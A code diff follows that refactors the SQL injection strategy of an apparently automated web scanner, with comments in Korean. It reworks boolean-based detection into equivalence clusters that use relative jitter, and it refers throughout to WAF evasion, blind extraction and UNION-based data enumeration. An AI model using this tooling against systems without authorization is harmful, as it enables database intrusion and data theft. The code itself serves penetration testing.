@@ -6,7 +6,7 @@ import requests
 
 from fbs.inference.models import AttackSurface, VulnResult
 from fbs.inference.validation import classify_waf_block, try_evade, apply_named_evasion, EVASION_TRANSFORMS
-from fbs.inference.compare import visible_text, diff_score
+from fbs.inference.compare import visible_text, diff_score, probe_token
 from fbs.inference.sql_dialects import SQL_DIALECTS, DIALECT_PROBE_ORDER, detect_db_from_error, extract_error_snippet
 from fbs.inference.strategies.base import BaseStrategy
 
@@ -33,7 +33,6 @@ class SQLiStrategy(BaseStrategy):
     TIMEOUT = 10
     TIME_TIMEOUT = 15
 
-    UNION_MARKER   = 'sqli7e7esqli'
     MAX_UNION_COLS = 10
 
     # blind 이진 탐색용 문자 후보 (DB/테이블/컬럼 식별자는 보통 이 범위 안이라 32~126 전체보다 좁게 잡음).
@@ -42,10 +41,6 @@ class SQLiStrategy(BaseStrategy):
     # BETWEEN 비교의 상한. '<'·'>'가 밴일 때 x > n을 x BETWEEN n+1 AND 이 값으로 바꿔 쓰는데,
     # LENGTH/ASCII 값은 이 상한보다 훨씬 작아 안전하다.
     BLIND_MAX_INT  = 4294967295
-
-    # boolean 탐지에서 한 번에 동시 전송할 (true, false) 쌍 개수. 배치 안은 병렬, 배치 사이는
-    # 순차라서 신호를 찾으면 다음 배치로 안 넘어간다 — early-stop을 배치 단위로만 유지한다.
-    BOOLEAN_BATCH_SIZE = 4
 
     # time-based로 확정됐을 때 db_name에서 (방언, 연결어, 지연함수)를 뽑는 표. 시간 기반 blind
     # 추출이 어떤 지연함수로 조건부 지연을 만들지 정할 때 쓴다. SQLite는 지연함수가 없어 빠졌고,
@@ -60,15 +55,11 @@ class SQLiStrategy(BaseStrategy):
         'Oracle':              ('Oracle',     'AND', 'dbms_pipe'),
     }
 
-    # 같은 정상 요청을 몇 번 보내 statefulness/노이즈를 재는지. 5로 잡은 건 로그인 폼의 5회 실패 후
-    # 리셋 같은 누적 임계값을 실제로 넘겨봐야 상태 변화가 드러나기 때문이다(2회면 카운터가 0으로만 보인다).
-    IDEMPOTENCY_PROBES = 5
-    # 첫 응답 대비 최대 diff가 이 값을 넘으면 stateful(비멱등)로 본다. 정상 세션토큰 잡음은 보통
-    # 30 아래고, 페이지가 통째로 바뀌는 상태 전이는 그 위라서 30을 경계로 잡았다.
-    STATEFUL_NOISE_THRESHOLD = 30
-
     def __init__(self, session: requests.Session | None = None):
         self.session = session or requests.Session()
+        # UNION 반사 컬럼 탐지용 마커. fbssq 접두어 + 랜덤이라 페이지 기존 텍스트와 안 겹치고,
+        # 실제로 쪼개진 리터럴이 SELECT돼 화면에 완성됐을 때만 본문에서 발견된다.
+        self.UNION_MARKER = probe_token('fbssq')
         # (surface.url, surface.param, payload_shape) -> 최근 성공한 EVASION_TRANSFORMS 기법 이름.
         # 같은 필드라도 payload_shape(quote/boolean/error-time/blind 등)에 따라 페이로드 구조가
         # 달라서(따옴표 단독 vs AND/OR 대칭쌍 vs SLEEP 서브쿼리) 통하는 우회 기법이 갈린다. 그래서
@@ -86,13 +77,17 @@ class SQLiStrategy(BaseStrategy):
         # _evasion_cache가 아직 빈 첫 차단 때 전체 탐색 대신 이 기법부터 시도한다. 발견 당시 페이로드가
         # 특정 payload_shape와 안 맞을 수 있어 shape별이 아니라 필드 단위로만 넣어둔다.
         self._discovery_evasion_hint: dict[tuple, str] = {}
-        # (surface.url, surface.method) -> (stateful, page_noise, trace). 멱등성 프로브 결과를
-        # 엔드포인트 단위로 캐싱한다 — statefulness는 필드가 아니라 엔드포인트의 성질이라 같은
-        # 폼의 여러 필드(예: username/password)가 재사용한다.
-        self._idempotency: dict[tuple, tuple] = {}
         # (surface.url, surface.param) -> recon filter_map에서 밴으로 확인된 토큰 집합.
         # 페이로드 사전검열(밴 토큰 회피)과 차단 판정(payload-aware)에 쓴다.
         self._banned_tokens: dict[tuple, set] = {}
+
+    @staticmethod
+    def _separable(signal: int, jitter: int) -> bool:
+        """두 응답이 SQL 평가 때문에 갈렸는지 판정한다. signal은 갈려야 하는 두 응답의 diff,
+        jitter는 같은 조건 응답끼리의 흔들림(동적 요소로 저절로 생기는 차이)이다. 신호가 흔들림의
+        2배를 넘을 때만 참으로 본다 — 절대 노이즈 상수 대신 in-context 흔들림으로 상대 판정한다.
+        jitter가 0이어도 1자 차이 같은 우연은 거르도록 바닥을 1로 둔다."""
+        return signal > max(jitter * 2, 1)
 
     # ── BaseStrategy 인터페이스 ──────────────────────────────────────────────
 
@@ -140,10 +135,11 @@ class SQLiStrategy(BaseStrategy):
             print("    [SQLi] baseline 요청 실패 — 스킵")
             return []
 
-        # stateful(시도 카운터/리셋 등으로 요청마다 응답이 바뀜) 여부 + 요청별 변동폭(page_noise).
-        # stateful이면 content 기반 판정을 끄고 시간 기반 오라클로 전환한다. 자체 멱등성 프로브로 측정한다.
-        # (recon 측정 결과를 받아 재사용하도록 연결하는 건 이후 매핑 단계에서 한다.)
-        stateful, page_noise, idem_trace = self._probe_idempotency(surface, base_fields, baseline_body)
+        # stateful(시도 카운터/리셋 등으로 요청마다 응답이 바뀜) 여부는 recon이 측정 단계에서 분류한
+        # 라벨을 그대로 받아 쓴다 — 전략이 다시 재지 않는다. stateful이면 content 기반 판정을 끄고
+        # 시간 기반 오라클로 전환한다. content 오라클(boolean/blind/ORDER BY)의 노이즈 바닥은 따로
+        # 재지 않고, 각 오라클이 자기 응답(같은 조건 반복/등가 변형)으로 흔들림을 재 상대 판정한다.
+        stateful = bool(surface.extra.get('stateful'))
 
         # status만 바뀌고 본문 증거가 없는 약한 신호는 바로 확정 짓지 않고 보류해둔다 —
         # boolean 등 더 확실한 신호를 계속 찾아보고, 끝까지 아무것도 없으면 최후 수단으로 쓴다.
@@ -197,10 +193,10 @@ class SQLiStrategy(BaseStrategy):
         # 붙어서 먼저 시도한다. 단 stateful 타깃에선 참/거짓 본문 차이가 SQL 평가가 아니라 앱
         # 상태(카운터/리셋)에서 나와 못 믿으니, boolean을 건너뛰고 상태와 무관한 error/time으로 직행한다.
         if vuln_entry is None and stateful:
-            print(f"    [Stateful] 타깃이 stateful(trace={idem_trace}) — content 기반 boolean 탐지는 "
+            print(f"    [Stateful] recon이 stateful로 분류한 타깃 — content 기반 boolean 탐지는 "
                   f"신뢰 불가라 스킵, error/time으로 직행")
         elif vuln_entry is None:
-            vuln_entry = self._probe_boolean(surface, base_fields, baseline_body, original_value, quote_char, waf_hits, waf_evasions, quote_signal, page_noise)
+            vuln_entry = self._probe_boolean(surface, base_fields, original_value, quote_char, waf_hits, waf_evasions, quote_signal)
 
         if vuln_entry is None:
             vuln_entry = _confirm(self._probe_error_time(surface, base_fields, baseline_status, baseline_elapsed, quote_char, waf_hits, waf_evasions, quote_signal, known_dialect=known_dialect))
@@ -218,7 +214,6 @@ class SQLiStrategy(BaseStrategy):
         vuln_entry['waf_hits'] = waf_hits
         vuln_entry['waf_evasions'] = waf_evasions
         vuln_entry['stateful'] = stateful
-        vuln_entry['idem_trace'] = idem_trace
         # dialect를 못 알아낸 경로로 확정됐으면(detected_db가 없거나 'Unknown') recon이 찾아둔 값으로
         # 채워서, _resolve_dialect가 재프로빙 없이 재사용하게 한다.
         if known_dialect and vuln_entry.get('detected_db') in (None, 'Unknown'):
@@ -271,8 +266,7 @@ class SQLiStrategy(BaseStrategy):
                 comment = '-- '
 
         self._go_enumerate(surface, base_fields, enum_baseline_body, enum_baseline_status, vuln_entry,
-                            injection_prefix, comment, waf_hits, waf_evasions,
-                            page_noise=page_noise, stateful=stateful)
+                            injection_prefix, comment, waf_hits, waf_evasions, stateful=stateful)
         self._print_summary(surface, quote_char, vuln_entry)
         return [self._to_vuln_result(surface, vuln_entry)]
 
@@ -299,9 +293,9 @@ class SQLiStrategy(BaseStrategy):
         if db_display and db_display != 'Unknown':
             print(f"    DB        : {db_display}")
         if vuln_entry.get('stateful'):
-            print(f"    ⚠ 상태    : stateful 타깃(멱등성 프로브 trace={vuln_entry.get('idem_trace')}) — 같은 요청에도 "
-                  f"응답이 바뀜(시도 카운터/리셋 등). content 기반 판정은 신뢰 낮아 시간 기반 오라클만 사용했고, "
-                  f"자동 추출이 상태 리셋에 막힐 수 있으니 수동 확인 권장")
+            print(f"    ⚠ 상태    : recon이 stateful로 분류한 타깃 — 같은 요청에도 응답이 바뀜(시도 카운터/리셋 등). "
+                  f"content 기반 판정은 신뢰 낮아 시간 기반 오라클만 사용했고, 자동 추출이 상태 리셋에 막힐 수 "
+                  f"있으니 수동 확인 권장")
 
         if vtype == 'Error-based SQL Injection (Quote Probe)':
             self._print_error_evidence(vuln_entry, f"따옴표 하나(\"{vuln_entry['payload']}\")만 넣었는데")
@@ -339,13 +333,13 @@ class SQLiStrategy(BaseStrategy):
 
         elif vtype == 'Boolean-based SQL Injection':
             waf_note = ' — WAF를 우회해서 확인함' if vuln_entry.get('waf_evaded') else ''
-            print(f"    근거      : 참/거짓 페이로드 쌍의 응답이 서로 다름 (본문 텍스트 내용 차이 기준으로 확인){waf_note}")
+            print(f"    근거      : 리터럴만 바꾼 참 조건들끼리·거짓 조건들끼리 응답이 뭉치고, 두 뭉치가 "
+                  f"갈림 (논리 진리값에 따라 갈리므로 SQL이 평가된 증거){waf_note}")
             print(f"                true  \"{vuln_entry['true_payload']}\" → {vuln_entry['true_response_len']}자")
             print(f"                false \"{vuln_entry['false_payload']}\" → {vuln_entry['false_response_len']}자")
-            print(f"                baseline={vuln_entry['baseline_len']}자, "
-                  f"page_noise={vuln_entry['page_noise']}, threshold={vuln_entry['noise_threshold']}, "
-                  f"diff_chars={vuln_entry['diff_chars']}")
-            print(f"                → 조건을 참/거짓으로 바꿨을 때 응답이 달라진다는 건 그 조건이 "
+            print(f"                뭉치 내부 흔들림={vuln_entry['intra_spread']}자, 뭉치 사이 간격={vuln_entry['separation']}자 "
+                  f"(간격 > 흔들림×2라야 확정)")
+            print(f"                → 글자(리터럴)가 아니라 참/거짓 논리로 갈린다는 건 그 조건이 "
                   f"쿼리 로직 안에서 실제로 평가되고 있다는 뜻")
 
         waf_evasions = vuln_entry.get('waf_evasions') or []
@@ -601,43 +595,6 @@ class SQLiStrategy(BaseStrategy):
         return status, body, elapsed, used_payload, True
 
     # ── 요청 전송 ────────────────────────────────────────────────────────────
-
-    # ── 0. 멱등성 프로브 (stateful 여부 + 노이즈 측정) ────────────────────────
-
-    def _probe_idempotency(self, surface, base_fields, first_body: str) -> tuple[bool, int, list]:
-        """이 엔드포인트가 stateful(요청마다 상태가 바뀜)인지, 그리고 페이지의 진짜 요청별
-        변동폭(page_noise)을 판정한다.
-
-        똑같은 정상 요청(base_fields — 우리 입력을 바꾸지 않는다)을 IDEMPOTENCY_PROBES개 순차로 보내
-        (병렬은 상태 레이스로 측정을 오염시킨다) 첫 응답 대비 이후 응답들의 visible text diff를 잰다.
-        로그인 폼의 틀린 로그인 N회 후 리셋/잠금처럼 누적 상태가 있으면, 같은 요청을 여러 번 보내는
-        것 자체가 카운터를 넘겨 응답이 도중에 바뀐다 — 그래서 2회로는 부족하고 임계값을 넘길 만큼 보낸다.
-
-        page_noise(첫 응답 대비 최대 diff)가 STATEFUL_NOISE_THRESHOLD를 넘으면 stateful로 보고(호출부가
-        content 오라클을 끄고 시간 기반으로 전환), 안 넘으면 그 값을 이후 boolean/blind/ORDER BY 판정의
-        동적 임계값 바닥으로 쓴다(엔드포인트당 한 번만 재고 공유).
-
-        결과는 (url, method)로 캐싱한다. first_body는 run()이 받아둔 baseline을 첫 샘플로 재사용해
-        요청 1개를 아낀다. 반환: (stateful, page_noise, trace)."""
-        key = (surface.url, surface.method)
-        cached = self._idempotency.get(key)
-        if cached is not None:
-            return cached
-
-        ref_text = visible_text(first_body)
-        trace = []
-        for _ in range(self.IDEMPOTENCY_PROBES - 1):
-            status, body, _ = self._send(surface, dict(base_fields))
-            text = visible_text(body) if status is not None else ref_text
-            trace.append(diff_score(ref_text, text))
-        page_noise = max(trace) if trace else 0
-        stateful = page_noise > self.STATEFUL_NOISE_THRESHOLD
-        verdict = 'stateful(비멱등) — content 오라클 신뢰 불가, 시간 기반 전환' if stateful else '멱등'
-        print(f"    [Idem] {surface.method} {surface.url} 동일 요청 {self.IDEMPOTENCY_PROBES}회 — "
-              f"diff trace={trace} → page_noise={page_noise} ({verdict})")
-        result = (stateful, page_noise, trace)
-        self._idempotency[key] = result
-        return result
 
     # ── 1. Quote probe ───────────────────────────────────────────────────────
 
@@ -968,204 +925,147 @@ class SQLiStrategy(BaseStrategy):
 
     # ── 4. Noise 측정 → Boolean → Fingerprint ────────────────────────────────
 
-    def _probe_boolean(self, surface, base_fields, baseline_body, original_value, quote_char, waf_hits: list, waf_evasions: list,
-                        quote_signal: dict, page_noise: int) -> dict | None:
-        bool_payloads = self._build_boolean_payloads(original_value, quote_char)
-        base_len = len(baseline_body)
+    def _probe_boolean(self, surface, base_fields, original_value, quote_char, waf_hits: list,
+                        waf_evasions: list, quote_signal: dict) -> dict | None:
+        """스캐폴드(따옴표·연결어·주석으로 고정된 페이로드 껍데기)마다 등가 클러스터를 돌려, 참/거짓이
+        리터럴이 아니라 논리 진리값에 따라 갈리는지로 boolean SQLi를 확정한다.
 
-        # page_noise(페이지의 진짜 요청별 변동폭)는 run()의 멱등성 프로브가 엔드포인트당 한 번
-        # 재서 넘겨준 값이라 여기서 또 측정하지 않는다. stateful 판정(noise>임계값)도 그 프로브가
-        # 하므로 원래는 run()에서 boolean을 안 부르지만, 방어적으로 한 번 더 확인한다.
-        if page_noise > self.STATEFUL_NOISE_THRESHOLD:
-            print(f"    [Bool] page_noise={page_noise} 너무 큼 — boolean 스킵")
-            return None
-        noise_threshold = max(page_noise * 2, 5)
-        print(f"    [Bool] page_noise={page_noise} → threshold={noise_threshold}")
+        절대 노이즈 바닥은 안 쓴다 — 같은 조건(참 변형끼리)의 흔들림을 그 자리에서 재(jitter), 참/거짓
+        간격이 그 흔들림보다 확실히 클 때만(_separable) 신호로 본다. 동적 페이지면 흔들림이 커져 자동으로
+        더 큰 간격을 요구한다.
 
-        # quote_signal['hopeless']는 quote probe 결과의 참고 정보일 뿐, 그것만으로 boolean의 quote 포함
-        # 페이로드를 예단해 스킵하지 않는다 — quote probe는 따옴표 하나짜리라, 그게 막혔다고 AND/OR가
-        # 붙은 boolean 페이로드도 똑같이 막힌다는 보장은 없다(페이로드 구조에 따라 우회 성패가 갈린다).
-        # 그래서 boolean은 자기 구조로 첫 quote 포함 페이로드를 반드시 한 번 직접 시도하고, 그것까지
-        # 실패했을 때만(quote probe 실패 + boolean 자체 확인 실패, 두 증거가 겹칠 때만) 이후 스킵한다.
-        # BOOLEAN_BATCH_SIZE개씩 묶어 배치 안의 true/false 요청을 동시에 쏜다. 배치 사이는 순차라 신호를
-        # 찾거나 quote_hopeless가 확정되면 다음 배치부터 바로 반영된다 — 다만 같은 배치 안 페이로드는
-        # hopeless 확정 전에 이미 제출된 상태라, 배치 안에서 hopeless가 확정되면 최대 (BATCH_SIZE-1)쌍은
-        # 이미 보낸 뒤일 수 있다(WAF가 quote를 확실히 막는 좁은 경우에만 생기는 손실이라 감수한다).
-        boolean_quote_hopeless = False
-        total_batches = (len(bool_payloads) + self.BOOLEAN_BATCH_SIZE - 1) // self.BOOLEAN_BATCH_SIZE
-        with concurrent.futures.ThreadPoolExecutor(max_workers=self.BOOLEAN_BATCH_SIZE * 2 + 2) as pool:
-            for batch_idx, batch_start in enumerate(range(0, len(bool_payloads), self.BOOLEAN_BATCH_SIZE), 1):
-                batch = bool_payloads[batch_start:batch_start + self.BOOLEAN_BATCH_SIZE]
-                # 이 배치를 제출하는 시점까지 확정된 hopeless 값으로만 필터링한다.
-                active = [(tp, fp, bf, st) for tp, fp, bf, st in batch if not (quote_char in tp and boolean_quote_hopeless)]
-                skipped_count = len(batch) - len(active)
-                batch_label = f"배치 {batch_idx}/{total_batches} ({batch_start + 1}~{batch_start + len(batch)}번째 쌍)"
-                if not active:
-                    # 요청은 안 보내지만, 이 배치 전체가 스킵됐다는 것도 결과 요약이니 한 줄 남긴다.
-                    print(f"    [Bool] {batch_label}: 전부 스킵(quote 우회 불가로 이미 확인됨)")
-                    continue  # 이 단계에서 첫 quote 포함 페이로드가 이미 실패 확인됨 — 요청 없이 스킵
+        스캐폴드 순서는 footprint(타입/따옴표 문맥)로 매긴다 — 유력한 것부터 돌려 첫 확정에서 멈춘다.
+        단 순서일 뿐 제외는 안 한다(따옴표 하나는 숫자형도 깨뜨려 타입 신호가 확정 증거가 못 됨).
 
-                # quiet=True — 배치 안 1차 시도는 [Evade] 개별 로그를 안 찍는다. 병렬로 쏘면 여러
-                # 스레드의 우회 로그가 뒤섞여 어느 쌍 것인지 구분이 안 되니, 배치가 끝난 뒤 우회
-                # 필요/성공 건수만 한 줄로 요약한다. 기록은 quiet과 무관하게 그대로 남는다.
-                failed_count = 0
-                evaded_count = 0
-                submitted = [
-                    (orig_true, orig_false, build_fn, style,
-                     pool.submit(self._send_evading, surface, base_fields, orig_true,
-                                 'boolean(true)', waf_hits, waf_evasions, quiet=True),
-                     pool.submit(self._send_evading, surface, base_fields, orig_false,
-                                 'boolean(false)', waf_hits, waf_evasions, quiet=True))
-                    for orig_true, orig_false, build_fn, style in active
-                ]
+        단계(스캐폴드당):
+          Layer 1 — 참2 + 거짓1 (상대 선-게이트): jitter=참끼리 흔들림, signal=참↔거짓 최소 diff.
+                    signal이 흔들림을 못 넘으면(채널 없음/흔들림 수준) 다음 스캐폴드로.
+          Layer 2 — 참1 + 거짓2 더 보내 3:3 클러스터 완성 → 진리값대로 뭉치면 확정."""
+        numeric = str(original_value).isdigit()
 
-                # 원본 리스트 순서대로 결과를 처리해, 배치 안 여러 쌍이 동시에 신호를 보여도
-                # 순차 버전과 똑같이 먼저 오는 쌍부터 확정을 시도한다.
-                for orig_true, orig_false, build_fn, style, t_future, f_future in submitted:
-                    contains_quote = quote_char in orig_true
-                    t_status, t_body, _, true_payload, t_evaded = t_future.result()
-                    f_status, f_body, _, false_payload, f_evaded = f_future.result()
-                    if t_status is None or f_status is None:
-                        # quote_signal['hopeless']가 이미 True(quote probe도 실패)인데 boolean 자신의
-                        # 첫 quote 포함 페이로드까지 실패했을 때만(두 증거 겹칠 때만) 스킵을 켠다 —
-                        # quote probe가 성공했는데 이 템플릿만 우연히 실패한 거라면 성급하게 포기하지 않는다.
-                        if contains_quote and not boolean_quote_hopeless and quote_signal['hopeless']:
-                            boolean_quote_hopeless = True
-                            print(f"    [Bool] \"{quote_char}\" 포함 첫 페이로드 우회 실패(quote probe도 실패) — "
-                                  f"이후 이 단계의 \"{quote_char}\" 포함 페이로드는 스킵")
-                        failed_count += 1
-                        continue  # 요청 실패 또는 WAF 우회 전부 실패 — 이 쌍은 스킵
-                    waf_evaded = t_evaded or f_evaded
-                    if waf_evaded:
-                        evaded_count += 1
+        def _pref(style: str) -> int:
+            # footprint: 숫자형이면 순수 숫자 스타일을, 아니면 문자열 스타일을 앞으로.
+            if numeric:
+                return 0 if style == 'num' else 1
+            return 0 if style.startswith('str') else 1
 
-                    true_text, false_text = visible_text(t_body), visible_text(f_body)
-                    diff_chars = diff_score(true_text, false_text)
+        templates = sorted(self._build_boolean_payloads(original_value, quote_char),
+                           key=lambda t: _pref(t[3]))
+        variants = self._bool_cond_variants(quote_char)
 
-                    # 무신호 페이로드는 로그를 안 남긴다 — 여러 개를 순회하는 동안 나오는 흔한 경우라
-                    # 매번 찍으면 진짜 신호가 묻힌다. 후보(신호 있음)일 때만 입을 연다.
-                    if diff_chars <= noise_threshold:
-                        continue
+        # quote_signal['hopeless']는 quote probe가 따옴표 하나로 우회 전부 실패했음을 뜻하는 참고값이다.
+        # 그것만으로 예단하진 않고, 따옴표를 포함한 스캐폴드가 실제로 또 우회 전부 실패했을 때만(두 증거가
+        # 겹칠 때만) 이후 따옴표 포함 스캐폴드를 스킵한다.
+        quote_hopeless = False
+        tried = 0
+        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
+            for _, _, build, style in templates:
+                true_conds, false_conds = variants[style]
+                scaffold_has_quote = bool(quote_char) and quote_char in build(true_conds[0])
+                if scaffold_has_quote and quote_hopeless:
+                    continue
 
-                    print(f"    [Bool] 후보 발견: payload=\"{true_payload}\" true={len(true_text)}자 "
-                          f"false={len(false_text)}자 (diff_chars={diff_chars})")
+                # Layer 1 — 참2 + 거짓1 동시 전송. quiet=True: 병렬 우회 로그가 뒤섞이지 않게.
+                l1_payloads = [build(true_conds[0]), build(true_conds[1]), build(false_conds[0])]
+                l1 = [r.result() for r in [
+                    pool.submit(self._send_evading, surface, base_fields, p,
+                                'boolean(scan)', waf_hits, waf_evasions, quiet=True)
+                    for p in l1_payloads
+                ]]
+                if any(r[0] is None for r in l1):
+                    # 우회까지 전부 실패. 따옴표 포함 스캐폴드이고 quote probe도 실패했다면 이후 스킵.
+                    if scaffold_has_quote and not quote_hopeless and quote_signal['hopeless']:
+                        quote_hopeless = True
+                        print(f"    [Bool] \"{quote_char}\" 포함 스캐폴드 우회 실패(quote probe도 실패) — "
+                              f"이후 따옴표 포함 스캐폴드는 스킵")
+                    continue
+                tried += 1
+                t0, t1, f0 = (visible_text(r[1]) for r in l1)
+                jitter = diff_score(t0, t1)                       # 같은 조건(참)끼리 흔들림
+                signal = min(diff_score(t0, f0), diff_score(t1, f0))  # 참↔거짓 간격
+                if not self._separable(signal, jitter):
+                    continue  # 채널 없음 또는 흔들림 수준 — 다음 스캐폴드
 
-                    # 재검증 — 후보의 참/거짓 차이가 정말 SQL 불리언이 평가돼 생긴 건지, 아니면 앱
-                    # 필터/상태(해커 감지 메시지, 시도 횟수 리셋)가 특정 페이로드 내용에 반응해 우연히
-                    # 갈린 건지 구분한다. 같은 쌍을 한 번 더 보내는 걸로는 못 거른다(필터는 결정적이라
-                    # 그대로 재현된다). 대신 리터럴만 바꾼 등가 조건들이 참끼리·거짓끼리 그대로 뭉치는지
-                    # (논리적 등가 불변성)를 본다. 원리는 _verify_boolean_equivalence 참고.
-                    ok = self._verify_boolean_equivalence(
-                        surface, base_fields, build_fn, style, quote_char,
-                        true_text, false_text, noise_threshold, waf_hits, waf_evasions, pool,
-                    )
-                    if not ok:
-                        continue
+                print(f"    [Bool] 후보 스캐폴드: \"{l1[0][3]}\" (참↔거짓 간격={signal}, 참끼리 흔들림={jitter})")
 
-                    vuln_entry = {
-                        'type':               'Boolean-based SQL Injection',
-                        'detected_db':        'Unknown',
-                        'true_payload':       true_payload,
-                        'false_payload':      false_payload,
-                        'baseline_len':       base_len,
-                        'true_response_len':  len(true_text),
-                        'false_response_len': len(false_text),
-                        'page_noise':         page_noise,
-                        'noise_threshold':    noise_threshold,
-                        'diff_chars':         diff_chars,
-                        'waf_evaded':         waf_evaded,
-                    }
-                    # 방언 판별은 여기서 하지 않는다 — raw 응답 길이 + AND version LIKE '%' 방식은 uid
-                    # 동등비교처럼 참/거짓이 안 갈리는 앱에선 Unknown으로 실패한다. 대신 _go_enumerate가
-                    # UNION 추출 직전에 확정된 boolean 오라클(OR 기반, diff_score)로 판별한다 — blind의
-                    # _resolve_dialect와 같은 견고한 방식.
+                # Layer 2 — 클러스터 완성 후 진리값 뭉침 판정.
+                vuln_entry = self._verify_boolean_cluster(
+                    surface, base_fields, build, true_conds, false_conds,
+                    [t0, t1], [f0], l1[0][3], l1[2][3],
+                    waf_evaded=any(r[4] for r in l1), waf_hits=waf_hits, waf_evasions=waf_evasions, pool=pool,
+                )
+                if vuln_entry is not None:
                     return vuln_entry
 
-                # 이 배치에서 확정된 신호가 없었다 — 배치 하나의 결과를 한 줄로 요약한다. 개별 요청/우회
-                # 로그는 병렬로 뒤섞일 수 있지만, 이 요약은 배치가 끝난 뒤 메인 스레드에서만 찍어 항상
-                # 배치 순서대로 나온다.
-                skip_note   = f", 스킵 {skipped_count}쌍" if skipped_count else ""
-                evade_note  = f", 우회 {evaded_count}쌍" if evaded_count else ""
-                print(f"    [Bool] {batch_label}: 시도 {len(active)}쌍{skip_note}, "
-                      f"실패 {failed_count}쌍{evade_note} — 신호 없음")
-
-        print(f"    [Bool] {len(bool_payloads)}개 페이로드 전부 무신호 — boolean 탐지 실패")
+        print(f"    [Bool] 스캐폴드 {tried}개 시도 — 진리값대로 갈리는 신호 없음, boolean 탐지 실패")
         return None
 
-    def _verify_boolean_equivalence(self, surface, base_fields, build_fn, style: str, quote_char: str,
-                                     cand_true_text: str, cand_false_text: str, noise_threshold: int,
-                                     waf_hits: list, waf_evasions: list, pool) -> bool:
-        """후보로 잡힌 참/거짓 쌍이 정말 SQL 불리언이 평가돼 갈린 건지, 아니면 앱 필터/상태(해커 감지
-        메시지, 시도 횟수 리셋)가 특정 페이로드 내용에 반응해 우연히 갈린 건지 구분한다.
+    def _verify_boolean_cluster(self, surface, base_fields, build, true_conds, false_conds,
+                                 true_texts: list, false_texts: list, true_payload: str, false_payload: str,
+                                 *, waf_evaded: bool, waf_hits: list, waf_evasions: list, pool) -> dict | None:
+        """등가 클러스터로 참/거짓 차이가 논리 진리값 때문인지 특정 문자열(필터/상태) 때문인지를 가른다.
 
-        핵심 원리(논리적 등가 불변성): 진짜 boolean SQLi라면 리터럴이 1=1이든 2=2든 'a'='a'든 항상 참
-        조건은 전부 같은 응답으로, 항상 거짓 조건은 전부 같은 응답으로 뭉쳐야 한다. 필터/콘텐츠 기반
-        차이는 특정 문자열에만 반응하므로 리터럴을 바꾸면 이 뭉침이 깨진다. stateful 앱에서도 클러스터
-        응집이 깨져 자연히 걸러진다.
+        핵심 원리(논리적 등가 불변성): 진짜 boolean SQLi라면 1=1·2=2·9=9가 전부 같은 참 응답으로,
+        1=2·3=4·9=8이 전부 같은 거짓 응답으로 뭉친다. 필터/콘텐츠 차이는 특정 문자열에만 반응하므로
+        리터럴을 바꾸면 이 뭉침이 깨진다. stateful 앱도 클러스터 응집이 깨져 자연히 걸러진다.
 
-        후보에서 이미 받은 응답(cand_true_text/cand_false_text)을 각 클러스터의 첫 원소로
-        재사용하고, 리터럴만 바꾼 변형 2개씩만 추가로 보낸다(요청 4개). 판정:
-          - 참 클러스터 내부가 서로 유사(응집)하고
-          - 거짓 클러스터 내부도 서로 유사하며
-          - 두 클러스터의 어떤 쌍을 봐도 threshold보다 크게 갈릴 때만 확정.
-        변형 요청이 하나라도 실패하면(우회 불가 등) 보수적으로 확정 보류한다."""
-        true_conds, false_conds = self._bool_cond_variants(quote_char)[style]
-        # 인덱스 0은 후보가 이미 썼으므로 1번부터의 변형만 추가로 보낸다.
-        t_futures = [pool.submit(self._send_evading, surface, base_fields, build_fn(c),
-                                 'boolean(equiv-true)', waf_hits, waf_evasions) for c in true_conds[1:]]
-        f_futures = [pool.submit(self._send_evading, surface, base_fields, build_fn(c),
-                                 'boolean(equiv-false)', waf_hits, waf_evasions) for c in false_conds[1:]]
-
-        true_texts, false_texts = [cand_true_text], [cand_false_text]
+        Layer 1에서 받은 참2(true_texts)·거짓1(false_texts)을 재사용하고, 참1·거짓2를 더 보내 3:3을
+        채운다. 판정은 절대 임계가 아니라 상대값 — 뭉치 내부 흔들림(intra_spread)보다 뭉치 사이
+        간격(separation)이 2배 넘게 크면 확정(_separable). 변형 요청이 하나라도 실패하면 보류한다."""
+        t_futures = [pool.submit(self._send_evading, surface, base_fields, build(c),
+                                 'boolean(cluster-true)', waf_hits, waf_evasions) for c in true_conds[2:]]
+        f_futures = [pool.submit(self._send_evading, surface, base_fields, build(c),
+                                 'boolean(cluster-false)', waf_hits, waf_evasions) for c in false_conds[1:]]
         for futures, bucket, side in ((t_futures, true_texts, '참'), (f_futures, false_texts, '거짓')):
             for fut in futures:
                 st, body, _, _, _ = fut.result()
                 if st is None:
-                    print(f"    [Bool] 등가 재검증 실패 — {side} 변형 요청 불가(우회 실패 등), 확정 보류")
-                    return False
+                    print(f"    [Bool] 클러스터 {side} 변형 요청 불가(우회 실패 등) — 확정 보류")
+                    return None
                 bucket.append(visible_text(body))
 
-        def _cohesive(texts: list[str]) -> bool:
-            return all(diff_score(a, b) <= noise_threshold
-                       for i, a in enumerate(texts) for b in texts[i + 1:])
-
-        true_cohesive  = _cohesive(true_texts)
-        false_cohesive = _cohesive(false_texts)
+        intra_spread = max(
+            [diff_score(a, b) for texts in (true_texts, false_texts)
+             for i, a in enumerate(texts) for b in texts[i + 1:]] or [0]
+        )
         separation = min(diff_score(t, f) for t in true_texts for f in false_texts)
-        ok = true_cohesive and false_cohesive and separation > noise_threshold
-        print(f"    [Bool] 등가 클러스터 재검증: 참응집={true_cohesive} 거짓응집={false_cohesive} "
-              f"클러스터간 최소diff={separation}(threshold={noise_threshold}) → "
-              f"{'확정' if ok else '오탐 의심(리터럴 바꾸니 참/거짓 뭉침이 깨짐), 다음 페이로드로'}")
-        return ok
+        ok = self._separable(separation, intra_spread)
+        print(f"    [Bool] 등가 클러스터: 뭉치 내부 흔들림={intra_spread} 뭉치 사이 간격={separation} → "
+              f"{'확정' if ok else '오탐 의심(리터럴 바꾸니 뭉침이 깨짐), 다음 스캐폴드'}")
+        if not ok:
+            return None
+        # 방언 판별은 여기서 안 한다 — _go_enumerate가 UNION 추출 직전에 확정된 오라클로 판별한다.
+        return {
+            'type':               'Boolean-based SQL Injection',
+            'detected_db':        'Unknown',
+            'true_payload':       true_payload,
+            'false_payload':      false_payload,
+            'true_response_len':  len(true_texts[0]),
+            'false_response_len': len(false_texts[0]),
+            'intra_spread':       intra_spread,
+            'separation':         separation,
+            'waf_evaded':         waf_evaded,
+        }
 
     # ── 5. 공격벡터 확인: enumerate → union reflect → union extract ─────────
 
     def _go_enumerate(self, surface, base_fields, baseline_body, baseline_status, vuln_entry: dict,
